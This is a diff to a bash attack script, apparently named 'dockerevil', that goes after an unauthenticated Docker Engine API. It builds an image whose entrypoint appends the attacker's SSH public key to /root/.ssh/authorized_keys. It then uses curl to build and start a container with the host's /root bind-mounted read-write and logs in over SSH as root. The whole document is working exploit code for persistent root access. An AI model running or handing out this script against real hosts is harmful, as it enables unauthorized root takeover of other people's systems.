@@ -44,7 +44,7 @@ then
 
 
 ## Checking for SSH key file on default location, change here in case you have the SSH key on another path...
-	bool=$(ls ~/.ssh/id_rsa.pub 2> /dev/null; echo $?)
+	bool=$(ls ~/.ssh/id_rsa.pub &> /dev/null; echo $?)
 	if [ $bool -eq 0 ]
 	then
 		echo -e "Default SSH key path detected. Copying it...\n"
@@ -64,7 +64,7 @@ then
 	echo -e "Done\n"
 
 	echo "Writing Dockerfile..."
-	echo -e "FROM $IMG_ID \nUSER root \nENTRYPOINT echo '"$RSA"' >> /root/.ssh/authorized_keys" > Dockerfile
+	echo -e "FROM $IMG_ID \nUSER root \nENTRYPOINT echo 'ssh-rsa "$RSA"' >> /root/.ssh/authorized_keys" > Dockerfile
 	echo "Compressing Dockerfile...."
 
 ##	Checking the compression
@@ -82,22 +82,20 @@ then
 		## Closing the Check for compression success if statement
 		fi
 
-#################### SO FAR, ALL SEEMS GOOD, YOU CHECK FROM HERE ON....... ######################################
-
-	echo "Building image with custom entrypoint..."
-	curl -s -XPOST -H "Content-type: application/x-tar" --data-binary @dockerevil.tar "http://$HOST/build" ##Please change this shit >>> | grep -o "built ............" > skiddie
-##NEW
-##IMG_ID=$(curl -s -XPOST -H "Content-type: application/x-tar" --data-binary @dockerevil.tar "http://$HOST/build" | awk '/built/ {print $3}' | sed 's/.\{5\}$//')
-
-
-	IMG_ID=$( cut -d " " -f2,2 skiddie)
-	rm skiddie
+	 ## Building image
+	echo "Building the image..."
+	BUILD_ID=$(curl -s -XPOST -H "Content-type: application/x-tar" --data-binary @dockerevil.tar "http://$HOST/build" | awk '/built/ {print $3}' | sed 's/.\{5\}$//')
 	echo "Done"
-	echo "Creating image"
-	IMG_ID=$(curl -H "Content-Type: application/json" -d '{"Image" : "'"$IMG"'", "Binds" : ["/root/:/root/:rw,z"]}' -XPOST "http://$HOST/containers/create" | awk -F ":" ' {print $2} '| awk -F "," ' {print $1}' | sed 's/"//g')
+
+	## Creating image
+	echo "Creating image..."
+	IMG_ID=$(curl -H "Content-Type: application/json" -d '{"Image" : "'"$BUILD_ID"'", "Binds" : ["/root/:/root/:rw,z"]}' -XPOST "http://$HOST/containers/create" | awk -F ":" ' {print $2} '| awk -F "," ' {print $1}' | sed 's/"//g')
 	echo "Done"
+	rm dockerevil.tar
+
+	## Starting image
 	echo "Starting image"
-	curl -s -XPOST http://$HOST/containers/$IMG_ID/start -v 2> /dev/null
+	curl -s -XPOST http://$HOST/containers/$IMG_ID/start -v
 	echo "Done"
 	ssh_host=$(echo $HOST | awk -F ":" ' {print $1} ')
 	ssh root@$ssh_host
